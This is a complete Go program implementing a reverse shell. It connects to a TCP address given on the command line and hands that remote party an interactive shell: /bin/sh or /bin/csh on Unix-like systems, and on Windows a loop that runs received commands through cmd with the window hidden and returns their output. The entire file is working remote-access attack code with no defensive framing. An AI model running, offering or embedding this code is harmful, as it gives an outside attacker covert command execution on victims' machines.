package main

import (
	"bufio"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"syscall"
)

func ReverseShell(connectString string) {
	var cmd *exec.Cmd
	if len(connectString) == 0 {
		log.Fatal("invalid reverse shell remote addr: ", connectString)
	}
	conn, err := net.Dial("tcp", connectString)
	if err != nil {
		log.Fatal("fail to connect remote addr: ", connectString)
	}

	switch runtime.GOOS {
	case "windows":
		execWin(conn)
		return
	case "linux":
		cmd = exec.Command("/bin/sh")
	case "freebsd":
		cmd = exec.Command("/bin/csh")
	default:
		cmd = exec.Command("/bin/sh")
	}

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	_ = cmd.Run()
}

func execWin(conn net.Conn){
	for{
		status, _ := bufio.NewReader(conn).ReadString('\n');
		//显示输入命令
		// fmt.Println(status)
		//输入exit命令退出
		if status == "exit\n" {
			break
		}
		//输入Ctrl+C时字符为空退出
		if status == "" {
			break
		}
		//执行命令返回结果
		cmd := exec.Command("cmd", "/C", status)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.Output();
		conn.Write([]byte(out))
	}
}

func main() {
	ReverseShell(os.Args[1])
}
